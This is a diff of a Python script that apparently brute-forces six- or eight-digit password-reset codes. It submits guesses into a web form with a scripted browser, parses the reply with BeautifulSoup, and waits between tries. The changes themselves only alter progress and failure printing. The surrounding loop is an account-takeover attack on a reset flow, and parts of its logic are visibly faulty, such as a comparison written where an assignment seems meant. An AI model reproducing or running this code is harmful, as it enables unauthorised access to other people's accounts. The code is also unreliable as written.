@@ -87,12 +87,15 @@ if check1 != test:
     y == reset
     browser.form['n'] = str(y)
     browser.submit()
-    print(str(reset))
+    print(str(reset), end='\r')
+    fail = (str(y), failed)
+    s = " "
     reset = reset-1
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     check1 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
     sleep(30)
+    print(s.join(fail))
 elif check2 != test:
   reset = 99999999
   while check2 != test or reset > 99999999:
@@ -100,13 +103,15 @@ elif check2 != test:
     y == reset
     browser.form['n'] = str(y)
     browser.submit()
-    url = browser.geturl()
-    print(str(reset))
+    print(str(reset), end='\r')
+    fail = (str(y), failed)
+    s = " "
     reset = reset-1
     response1 = browser.response()
     soup = BeautifulSoup(response1, 'html.parser')
     check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
     sleep(30)
+    print(s.join(fail))
 else:
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
